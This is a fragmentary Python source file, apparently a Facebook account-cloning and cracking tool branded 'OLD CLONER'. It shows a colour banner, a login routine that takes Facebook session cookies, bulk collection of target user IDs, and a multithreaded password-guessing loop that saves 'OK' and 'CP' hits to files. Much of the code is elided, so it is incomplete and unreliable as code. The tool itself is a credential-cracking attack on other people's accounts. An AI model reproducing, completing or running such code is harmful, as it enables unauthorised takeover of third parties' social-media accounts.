...
\033[1;93m ____  ____  ___  ___  _   _  ____ 
\033[1;93m(  _ \(_  _)/ __)/ __)( )_( )(_  _)
\033[1;93m )___/ _)(_( (__( (__  ) _ (  _)(_ 
\033[1;93m(__)  (____)\___)\___)(_) (_)(____)

\033[1;93m─────────────────────────────────────────────────────
\033[1;95m[\033[1;93m✔︎\033[1;95m]\033[1;93m AUTHOR  \033[1;91m : \033[1;95mPSYCHO PICCHI
\033[1;95m[\033[1;93m✔︎\033[1;95m]\033[1;93m FACEBOOK\033[1;91m : \033[1;95mPSYCHO PICCHI
\033[1;95m[\033[1;93m✔︎\033[1;95m]\033[1;93m GITHUB  \033[1;91m : \033[1;95mPSYCHO-PICCHI
\033[1;95m[\033[1;93m✔︎\033[1;95m]\033[1;93m TOOLS   \033[1;91m : \033[1;95mOLD CLONER
\033[1;93m─────────────────────────────────────────────────────                                         ''')   
...
def login_lagi334():
	try:
		...
		cookie=input(f'{k}[•] LOGIN WITH FB COOKIES :{asu} ')
		...
		print(f'{x}[{u}✔︎{x}]{u} LOGIN SUCCESSFUL {x} ');time.sleep(1)
		exit()
	except Exception as e:
...
def dump_massal():
	...
	for met in range(jum):
		yz+=1
		kl = input('INPUT ID\033[1;94m '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
...
def passwrd():
	os.system('clear')
	banner()
	jalan(f'{x}{h}[✔︎] OK RESULTS SAVED IN : {h}OK/%s {x}'%(okc))
	jalan(f'{x}{k}[✔︎] CP RESULTS SAVED IN : {k}CP/%s {x}'%(cpc))
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	jalan(f'CRACK SELECT')
	print('BACK AGAIN (ya/no ) ? ')
	woi = input('CHOICE : ')
	if woi in ['ya','Y']:
		back()
	else:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{H}PSYCHO {P}{b}{loop}{P}-{u}{len(id)}{P}•{P}{H}{ok}{P}•{P}{k}{cp}{x}[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
